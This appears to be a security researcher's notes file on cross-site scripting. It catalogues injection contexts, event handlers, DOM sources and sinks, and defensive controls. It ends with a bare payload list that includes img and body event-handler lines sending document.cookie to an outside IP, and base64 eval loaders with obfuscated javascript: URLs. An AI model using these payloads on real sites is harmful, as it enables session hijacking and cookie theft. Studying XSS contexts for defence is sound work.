# XSS PAYLOADS
-

# XSS Injection Contexts & Common Element Categories

> Note: This document is intended for defensive security research, detection engineering, secure coding, and understanding how browsers process untrusted input.

## 1. HTML Element Injection Context

User input is rendered directly into HTML.

```html
<div>USER_INPUT</div>
```

### Common Elements

- `div`
- `span`
- `p`
- `h1-h6`
- `table`
- `ul`
- `ol`

### Risk

If input is not escaped, an attacker may be able to inject new HTML elements.

---

## 2. Event Handler Context

Execution is triggered through HTML event attributes.

### Common Elements

```html
<body>
<img>
<svg>
<input>
<textarea>
<button>
<form>
<video>
<audio>
<iframe>
```

### Common Event Types

| Category | Examples |
|-----------|-----------|
| Load Events | `onload`, `onerror` |
| Mouse Events | `onclick`, `onmouseover`, `onmouseout` |
| Keyboard Events | `onkeydown`, `onkeyup` |
| Focus Events | `onfocus`, `onblur` |
| Form Events | `onsubmit`, `onchange` |
| Media Events | `onplay`, `onpause` |

### Example Context

```html
<img src="x" EVENT_HERE>
```

---

## 3. SVG Context

SVG supports its own parsing rules and event model.

### Common SVG Elements

```html
<svg>
<g>
<animate>
<image>
<use>
<foreignObject>
<path>
```

### Research Areas

- SVG event handling
- SVG DOM parsing
- SVG namespace handling
- SVG sanitization bypasses

---

## 4. Image-Based Contexts

### Elements

```html
<img>
<picture>
<source>
```

### Trigger Types

- Resource load failures
- Resource load completion
- Browser parsing behavior

### Research Focus

- Image loading events
- Broken resource handling
- CSP interactions

---

## 5. Form Contexts

### Elements

```html
<form>
<input>
<select>
<textarea>
<button>
```

### Event Types

- `onfocus`
- `onblur`
- `onchange`
- `onsubmit`

---

## 6. Link / URL Contexts

User input is placed inside URLs.

### Elements

```html
<a>
<area>
<form action>
<iframe src>
```

### Example

```html
<a href="USER_INPUT">
```

### Research Areas

- URL sanitization
- Protocol filtering
- Browser URL parsing

---

## 7. Script Context

User input appears inside JavaScript.

### Example

```html
<script>
var data = "USER_INPUT";
</script>
```

### Variants

- String context
- Template literal context
- Object context
- Array context
- Function argument context

### Risk Level

Very High

---

## 8. Attribute Context

User input appears inside an HTML attribute.

### Example

```html
<input value="USER_INPUT">
```

### Common Attributes

```html
title
alt
value
placeholder
id
class
data-*
```

### Research Focus

- Quote escaping
- Attribute termination
- Context switching

---

## 9. CSS Context

User input is rendered into CSS.

### Example

```html
<style>
.example {
    content: "USER_INPUT";
}
</style>
```

### Locations

- `<style>`
- `style=""`
- CSS variables
- Inline styles

### Research Areas

- CSS escaping
- Browser parsing differences
- Legacy browser behavior

---

## 10. Iframe Context

### Elements

```html
<iframe>
<frame>
```

### Research Topics

- Sandbox restrictions
- Same-origin policy
- Embedded document behavior

---

## 11. DOM-Based XSS Contexts

Input reaches dangerous JavaScript sinks.

### Common Sources

```javascript
location.hash
location.search
document.URL
window.name
postMessage
```

### Common Sinks

```javascript
innerHTML
outerHTML
document.write()
insertAdjacentHTML()
eval()
setTimeout()
setInterval()
```

---

# XSS Context Classification

```text
XSS
├── Reflected
├── Stored
└── DOM-Based
```

---

# Injection Context Classification

```text
Injection Context
├── HTML
├── Attribute
├── JavaScript
├── CSS
├── URL
└── DOM Sink
```

---

# Common Research Workflow

```text
Input Source
      ↓
Rendering Context
      ↓
Browser Parser
      ↓
Execution Trigger
      ↓
Security Controls
      ↓
Result
```

---

# Security Controls to Evaluate

- Output Encoding
- HTML Sanitization
- CSP (Content Security Policy)
- Trusted Types
- HttpOnly Cookies
- SameSite Cookies
- Framework Auto-Escaping
- DOMPurify
- Template Escaping

---

# Useful Taxonomy

```text
Element
  ↓
Context
  ↓
Trigger
  ↓
Execution
  ↓
Mitigation
```

Examples:

```text
<img>
  ↓
Attribute Context
  ↓
Load/Error Event
  ↓
Browser Event Dispatch
  ↓
CSP / Sanitization
```

```text
<svg>
  ↓
SVG Parsing Context
  ↓
SVG Event
  ↓
DOM Execution
  ↓
Sanitization
```

```text
<body>
  ↓
Document Context
  ↓
Page Load
  ↓
Event Dispatch
  ↓
CSP
```





<img src=x onerror="xss_PAYLOAD">
<img src=x onerror="fetch('http://192.168.160.106:8000/test.png')">
<img src=x onerror="window.location='http://192.168.160.106:8000/?cookie='+document.cookie;">
username=<body onload=\"new Image().src='http://192.168.160.106:8080?c='+document.cookie;\">

fetch('http://IP ADDRESS/?c=' + document.cookie)
<svg onload="eval(atob('BASE64 ENCODE PAYLOAD'))">

ENCODED - > base64 playload -> pop up
<a href=ja&#x0D;vascript&colon;\u0065val(\u0061tob("YWxlcnQoInhzcyIp"))>test</a>
